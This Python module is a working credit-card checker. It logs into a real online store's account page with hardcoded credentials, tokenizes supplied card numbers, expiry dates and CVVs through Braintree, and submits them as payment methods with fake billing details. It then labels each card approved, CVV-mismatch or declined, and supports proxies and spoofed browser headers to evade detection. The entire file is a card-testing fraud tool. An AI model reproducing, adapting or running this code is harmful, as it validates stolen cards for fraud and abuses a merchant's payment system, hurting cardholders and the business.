"""b3auth.py — Braintree Auth (silvercellwireless.com add payment method)."""

from __future__ import annotations

import base64
import json
import random
import re
import string
import uuid
from urllib.parse import quote

import requests

_SITE = "https://silvercellwireless.com"
_ADD_PM_URL = f"{_SITE}/my-account/add-payment-method/"
_AJAX_URL = f"{_SITE}/wp-admin/admin-ajax.php"
_BT_GRAPHQL = "https://payments.braintree-api.com/graphql"

_LOGIN_USER = "opdevildragon@gmail.com"
_LOGIN_PASS = "DDcc55@&#"

HTTP_TIMEOUT = (10, 30)

_UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
)

_CCN_KEYWORDS = [
    "incorrect_cvc", "cvc_check: fail", "invalid_cvc", "cvv_decline",
    "declined_cvv", "wrong_cvc", "cvc_failure", "cvv_check: incorrect",
    "your card's security code is incorrect", "the cvc code is incorrect",
    "cvc mismatch", "security code incorrect", "cvv mismatch",
    "cvc does not match", "security code is invalid",
    "cvc code was not recognized", "invalid security code",
    "cvv_declined", "cvv2 declined", "cvv mismatch", "avs mismatch",
]

_DECLINED_PATTERNS = [
    r"Status code \d+: Processor Declined",
    r"woocommerce-error.*?Status code",
    r"BIN NOT FOUND",
    r"Processor Declined",
    r"declined",
    r"insufficient funds",
    r"card declined",
    r"do not honor",
    r"invalid card",
    r"expired card",
    r"incorrect pin",
    r"transaction not permitted",
    r"pick up card",
    r"lost card",
    r"stolen card",
    r"restricted card",
    r"hard decline",
    r"soft decline",
]


def _clean_msg(msg: str, limit: int = 120) -> str:
    s = re.sub(r"<[^>]+>", " ", str(msg or ""))
    s = re.sub(r"\s+", " ", s).strip()
    if "{" in s:
        s = s.split("{", 1)[0].strip()
    return s[:limit] if s else "Declined"


def is_ccn(msg: str) -> bool:
    ml = msg.lower()
    return any(kw in ml for kw in _CCN_KEYWORDS)


def _doc_headers() -> dict:
    return {
        "User-Agent": _UA,
        "Accept": (
            "text/html,application/xhtml+xml,application/xml;q=0.9,"
            "image/avif,image/webp,image/apng,*/*;q=0.8,"
            "application/signed-exchange;v=b3;q=0.7"
        ),
        "Accept-Language": "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Priority": "u=0, i",
    }


def _form_headers(referer: str | None = None) -> dict:
    h = _doc_headers()
    h.update({
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": _SITE,
        "Referer": referer or _ADD_PM_URL,
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
    })
    return h


def _ajax_headers() -> dict:
    return {
        "User-Agent": _UA,
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": _SITE,
        "Referer": _ADD_PM_URL,
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Sec-Ch-Ua": '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Accept-Language": "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
        "Priority": "u=1, i",
    }


def _bt_headers(auth_fingerprint: str) -> dict:
    return {
        "User-Agent": _UA,
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth_fingerprint}",
        "Braintree-Version": "2018-05-10",
        "Origin": "https://assets.braintreegateway.com",
        "Referer": "https://assets.braintreegateway.com/",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Accept-Language": "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
        "Priority": "u=1, i",
    }


def _extract_nonces(html: str) -> dict:
    login_nonce = re.search(r'name="woocommerce-login-nonce"\s+value="([^"]+)"', html)
    payment_nonce = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html)
    client_token_nonce = re.search(r'client_token_nonce":"([^"]+)"', html)
    device_session = re.search(r"correlation_id['\"]?\s*:\s*['\"]?([a-f0-9-]+)", html)
    return {
        "login_nonce": login_nonce.group(1) if login_nonce else None,
        "payment_nonce": payment_nonce.group(1) if payment_nonce else None,
        "client_token_nonce": client_token_nonce.group(1) if client_token_nonce else None,
        "device_session": device_session.group(1) if device_session else str(uuid.uuid4()),
    }


def _is_declined_html(html: str) -> bool:
    for pattern in _DECLINED_PATTERNS:
        if re.search(pattern, html, re.IGNORECASE):
            return True
    return False


def _extract_error_message(html: str) -> str | None:
    error_match = re.search(r'<div class="woocommerce-notices-wrapper">(.*?)</div>', html, re.DOTALL)
    if error_match:
        li_match = re.search(r"<li>(.*?)</li>", error_match.group(1), re.DOTALL)
        if li_match:
            return _clean_msg(li_match.group(1))
    error_match2 = re.search(r"woocommerce-error[^>]*>(.*?)</ul>", html, re.DOTALL)
    if error_match2:
        li_match2 = re.search(r"<li>(.*?)</li>", error_match2.group(1), re.DOTALL)
        if li_match2:
            return _clean_msg(li_match2.group(1))
    return None


def _card_type(cc: str) -> str:
    if cc.startswith("4"):
        return "visa"
    if cc.startswith(("51", "52", "53", "54", "55")) or cc.startswith("2"):
        return "master-card"
    if cc.startswith(("34", "37")):
        return "amex"
    return "visa"


def b3_check_card(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None,
) -> tuple[str, str, str]:
    """
    Braintree Auth via silvercellwireless.com.

    Returns (status, message, code):
      status : approved | ccn | declined | error
      code   : cvv_approved | ccn | declined | proxy_error | ...
    """
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    session = requests.Session()
    session.trust_env = False
    if proxy_url:
        session.proxies.update({"http": proxy_url, "https": proxy_url})

    try:
        r1 = session.get(_ADD_PM_URL, headers=_doc_headers(), timeout=HTTP_TIMEOUT)
        if r1.status_code >= 400:
            return "error", f"page_http_{r1.status_code}", "connection_error"

        nonces = _extract_nonces(r1.text)
        if not nonces["login_nonce"]:
            return "error", "Failed to extract login nonce", "setup_error"

        login_data = {
            "username": _LOGIN_USER,
            "password": _LOGIN_PASS,
            "woocommerce-login-nonce": nonces["login_nonce"],
            "_wp_http_referer": "/my-account/add-payment-method/",
            "login": "Log in",
        }
        r2 = session.post(_ADD_PM_URL, data=login_data, headers=_form_headers(), timeout=HTTP_TIMEOUT)
        if r2.status_code >= 400:
            return "error", f"login_http_{r2.status_code}", "connection_error"

        updated = _extract_nonces(r2.text)
        payment_nonce = updated["payment_nonce"] or nonces["payment_nonce"]
        client_token_nonce = updated["client_token_nonce"] or nonces["client_token_nonce"]
        device_session = updated["device_session"] or nonces["device_session"]

        if not client_token_nonce:
            return "error", "Failed to extract client token nonce", "nonce_error"
        if not payment_nonce:
            return "error", "Failed to extract payment nonce", "nonce_error"

        token_resp = session.post(
            _AJAX_URL,
            data={
                "action": "wc_braintree_credit_card_get_client_token",
                "nonce": client_token_nonce,
            },
            headers=_ajax_headers(),
            timeout=HTTP_TIMEOUT,
        )
        try:
            token_json = token_resp.json()
        except json.JSONDecodeError:
            return "error", "Invalid client token response", "auth_error"

        if "data" not in token_json:
            return "error", _clean_msg(str(token_json.get("message") or token_json)), "auth_error"

        decoded = base64.b64decode(token_json["data"]).decode("utf-8")
        auth_data = json.loads(decoded)
        auth_fingerprint = auth_data.get("authorizationFingerprint")
        if not auth_fingerprint:
            return "error", "Failed to extract authorization fingerprint", "auth_error"

        gql_payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": device_session,
            },
            "query": (
                "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
                "tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
            ),
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mm,
                        "expirationYear": yy,
                        "cvv": cvv,
                    },
                    "options": {"validate": False},
                },
            },
            "operationName": "TokenizeCreditCard",
        }
        bt_resp = session.post(
            _BT_GRAPHQL,
            json=gql_payload,
            headers=_bt_headers(auth_fingerprint),
            timeout=HTTP_TIMEOUT,
        )
        try:
            bt_json = bt_resp.json()
        except json.JSONDecodeError:
            return "error", "Invalid Braintree response", "auth_error"

        if bt_json.get("errors"):
            err_msg = bt_json["errors"][0].get("message", "Tokenization failed")
            err_msg = _clean_msg(err_msg)
            if is_ccn(err_msg):
                return "ccn", err_msg, "ccn"
            return "declined", err_msg, "declined"

        card_token = (bt_json.get("data") or {}).get("tokenizeCreditCard", {}).get("token")
        if not card_token:
            return "declined", "Failed to get card token", "declined"

        device_data = quote(json.dumps({"correlation_id": device_session}), safe="")
        card_type = _card_type(cc)
        payment_data = (
            f"payment_method=braintree_credit_card"
            f"&wc-braintree-credit-card-card-type={card_type}"
            f"&wc-braintree-credit-card-3d-secure-enabled"
            f"&wc-braintree-credit-card-3d-secure-verified"
            f"&wc-braintree-credit-card-3d-secure-order-total=0.00"
            f"&wc_braintree_credit_card_payment_nonce={card_token}"
            f"&wc_braintree_device_data={device_data}"
            f"&wc-braintree-credit-card-tokenize-payment-method=true"
            f"&billing_first_name=Erik"
            f"&billing_last_name=Ragara"
            f"&billing_country=US"
            f"&billing_address_1=123+Allen+Street"
            f"&billing_address_2="
            f"&billing_city=NEW+YORK"
            f"&billing_state=NY"
            f"&billing_postcode=10001"
            f"&billing_email={quote(_LOGIN_USER)}"
            f"&woocommerce-add-payment-method-nonce={payment_nonce}"
            f"&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F"
            f"&woocommerce_add_payment_method=1"
        )

        pay_resp = session.post(
            _ADD_PM_URL,
            data=payment_data,
            headers=_form_headers(),
            timeout=HTTP_TIMEOUT,
        )
        html = pay_resp.text or ""
        low = html.lower()

        if _is_declined_html(html):
            err = _extract_error_message(html) or "Transaction was declined"
            if is_ccn(err):
                return "ccn", err, "ccn"
            return "declined", err, "declined"

        if "payment method added successfully" in low:
            return "approved", "Payment method added successfully", "cvv_approved"

        if "nice!" in low or "avs" in low:
            return "approved", "Card verified successfully", "cvv_approved"

        err = _extract_error_message(html)
        if err:
            if is_ccn(err):
                return "ccn", err, "ccn"
            return "declined", err, "declined"

        return "declined", "Unknown error", "declined"

    except requests.Timeout:
        return "error", "Request timed out", "timeout"
    except requests.exceptions.ProxyError as e:
        return "error", f"Proxy error: {str(e)[:60]}", "proxy_error"
    except requests.exceptions.ConnectionError as e:
        return "error", f"Connection error: {str(e)[:60]}", "connection_error"
    except requests.RequestException as e:
        low = str(e).lower()
        if "proxy" in low or "tunnel" in low:
            return "error", str(e)[:80], "proxy_error"
        return "error", str(e)[:80], "connection_error"
    except Exception as e:
        return "error", str(e)[:80], "exception"
